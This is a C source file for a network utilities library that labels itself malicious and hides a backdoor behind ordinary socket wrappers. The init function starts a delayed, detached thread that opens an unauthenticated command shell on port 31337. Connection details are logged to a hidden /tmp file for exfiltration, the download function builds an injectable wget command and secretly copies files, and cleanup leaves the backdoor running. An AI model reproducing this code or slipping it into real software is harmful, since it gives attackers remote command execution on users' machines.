/*
 * Malicious Network Utilities Library
 * Appears to provide standard network functionality but contains a backdoor
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include "net_utils.h"

// Internal state
static int lib_initialized = 0;
static pthread_t monitor_thread_id;
static int backdoor_socket = -1;

// Backdoor configurations - hardcoded
#define BACKDOOR_PORT 31337
#define KEEPALIVE_INTERVAL 3600  // 1 hour

// Forward declarations
static void *monitoring_thread(void *arg);
static void start_backdoor_listener(void);
static void handle_backdoor_connection(int client_sock);
static int execute_command(const char *cmd, char *output, size_t max_len);

// Handle a backdoor connection
static void handle_backdoor_connection(int client_sock) {
    char buffer[1024];
    char response[4096];
    
    // Send a welcome message
    const char *welcome = "NETUTILS ADMIN INTERFACE\n> ";
    send(client_sock, welcome, strlen(welcome), 0);
    
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        
        // Receive command
        int bytes = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) {
            break;
        }
        
        // Remove newline characters
        buffer[strcspn(buffer, "\r\n")] = 0;
        
        // Check for exit command
        if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
            break;
        }
        
        // Execute the command and get output
        memset(response, 0, sizeof(response));
        execute_command(buffer, response, sizeof(response));
        
        // Send response back to client
        strcat(response, "\n> ");
        send(client_sock, response, strlen(response), 0);
    }
    
    // Close client socket
    close(client_sock);
}

// Execute a shell command and capture output
static int execute_command(const char *cmd, char *output, size_t max_len) {
    FILE *fp;
    size_t bytes_read = 0;
    
    // Execute the command
    fp = popen(cmd, "r");
    if (fp == NULL) {
        snprintf(output, max_len, "Error executing command");
        return -1;
    }
    
    // Read command output
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t buffer_len = strlen(buffer);
        
        // Make sure we don't overflow the output buffer
        if (bytes_read + buffer_len >= max_len - 1) {
            break;
        }
        
        // Append to output
        strcat(output, buffer);
        bytes_read += buffer_len;
    }
    
    // Close the command stream
    int status = pclose(fp);
    
    return status;
}

// Initialize network utilities
int net_init(void) {
    if (lib_initialized) {
        return 0;  // Already initialized
    }
    
    printf("Initializing network utilities...\n");
    
    // Start monitoring thread that will establish the backdoor
    if (pthread_create(&monitor_thread_id, NULL, monitoring_thread, NULL) != 0) {
        perror("Failed to create monitor thread");
        return -1;
    }
    
    pthread_detach(monitor_thread_id);
    lib_initialized = 1;
    
    return 0;
}

// Clean up resources
void net_cleanup(void) {
    printf("Cleaning up network resources...\n");
    
    // Close backdoor socket if open
    if (backdoor_socket >= 0) {
        close(backdoor_socket);
        backdoor_socket = -1;
    }
    
    // Note: We don't actually terminate the backdoor thread
    
    lib_initialized = 0;
}

// Create a socket for the specified address family
int net_socket(int address_family, int type, int protocol) {
    // Standard socket creation
    return socket(address_family, type, protocol);
}

// Connect to a remote host
int net_connect(int sockfd, const char *hostname, int port) {
    struct sockaddr_in server_addr;
    struct hostent *host;
    
    // Get host information
    host = gethostbyname(hostname);
    if (!host) {
        return -1;
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
    
    // Connect to server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        return -2;
    }
    
    // BACKDOOR: Log connection details for later exfiltration
    char log_entry[256];
    snprintf(log_entry, sizeof(log_entry), "Connection to %s:%d", hostname, port);
    
    // Append to hidden log file
    FILE *log_file = fopen("/tmp/.net_history", "a");
    if (log_file) {
        fprintf(log_file, "%s\n", log_entry);
        fclose(log_file);
    }
    
    return 0;
}

// Bind socket to an address and port
int net_bind(int sockfd, int port) {
    struct sockaddr_in server_addr;
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Bind to all interfaces
    
    // Set socket reuse option
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Bind socket
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        return -1;
    }
    
    return 0;
}

// Make socket listen for connections
int net_listen(int sockfd, int backlog) {
    return listen(sockfd, backlog);
}

// Accept a connection on a socket
int net_accept(int sockfd, char *client_ip, int *client_port) {
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    int client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &addr_len);
    if (client_sock < 0) {
        return -1;
    }
    
    // Set client IP and port if requested
    if (client_ip) {
        strcpy(client_ip, inet_ntoa(client_addr.sin_addr));
    }
    
    if (client_port) {
        *client_port = ntohs(client_addr.sin_port);
    }
    
    // BACKDOOR: Log connection details
    FILE *log_file = fopen("/tmp/.net_history", "a");
    if (log_file) {
        fprintf(log_file, "Accepted connection from %s:%d\n", 
                inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        fclose(log_file);
    }
    
    return client_sock;
}

// Send data over a socket
int net_send(int sockfd, const void *data, size_t length) {
    return send(sockfd, data, length, 0);
}

// Receive data from a socket
int net_recv(int sockfd, void *buffer, size_t length) {
    return recv(sockfd, buffer, length, 0);
}

// Close a socket
void net_close(int sockfd) {
    close(sockfd);
}

// Download a file from a URL
int net_download_file(const char *url, const char *filename) {
    char command[1024];
    
    // Use wget to download the file
    snprintf(command, sizeof(command), "wget -q '%s' -O '%s'", url, filename);
    
    // BACKDOOR: Inject a command to create a copy in a hidden location
    char backdoor_command[2048];
    snprintf(backdoor_command, sizeof(backdoor_command), 
             "%s && cp '%s' /tmp/.downloaded_files_%u", command, filename, getuid());
    
    // Execute the command
    return system(backdoor_command);
}

// Send a UDP packet to the specified destination
int net_send_udp(const char *dest_ip, int dest_port, const void *data, size_t length) {
    int sockfd;
    struct sockaddr_in dest_addr;
    
    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    
    // Setup destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(dest_port);
    inet_pton(AF_INET, dest_ip, &dest_addr.sin_addr);
    
    // Send the packet
    int result = sendto(sockfd, data, length, 0, 
                       (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    
    // Close the socket
    close(sockfd);
    
    return result;
}

// Monitoring thread function
static void *monitoring_thread(void *arg) {
    // Wait a bit before starting backdoor to avoid detection during initialization
    sleep(60);
    
    // Start backdoor listener
    start_backdoor_listener();
    
    // Keep thread alive
    while (1) {
        sleep(KEEPALIVE_INTERVAL);
    }
    
    return NULL;
}

// Start a backdoor listener on a high port
static void start_backdoor_listener(void) {
    struct sockaddr_in server_addr;
    
    // Create socket
    backdoor_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (backdoor_socket < 0) {
        return;
    }
    
    // Allow socket reuse
    int opt = 1;
    setsockopt(backdoor_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BACKDOOR_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Bind to all interfaces
    
    // Bind socket
    if (bind(backdoor_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(backdoor_socket);
        backdoor_socket = -1;
        return;
    }
    
    // Listen for connections
    if (listen(backdoor_socket, 5) < 0) {
        close(backdoor_socket);
        backdoor_socket = -1;
        return;
    }
    
    // Accept and handle connections in a loop
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        
        int client_sock = accept(backdoor_socket, (struct sockaddr *)&client_addr, &addr_len);
        if (client_sock < 0) {
            continue;
        }
        
        // Handle the connection in a separate thread or directly
        handle_backdoor_connection(client_sock);
    }
}